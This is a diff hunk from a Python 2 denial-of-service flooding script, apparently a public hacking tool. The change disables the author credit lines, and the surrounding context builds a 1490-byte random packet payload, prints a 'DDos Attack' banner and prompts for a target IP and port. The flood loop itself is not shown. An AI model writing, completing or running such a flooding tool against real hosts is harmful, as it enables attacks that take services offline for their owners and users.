@@ -19,11 +19,12 @@ bytes = random._urandom(1490)
 
 os.system("clear")
 os.system("figlet DDos Attack")
-
+"""
 print "Author    : J4$$Y"
 print "You Tube  : www.youtube.com/c/mohammedjaseemtp"
 print "github    : www.github.com/Mohammedjaseem"
 print "Website   : www.jaseem.tech"
+"""
 
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
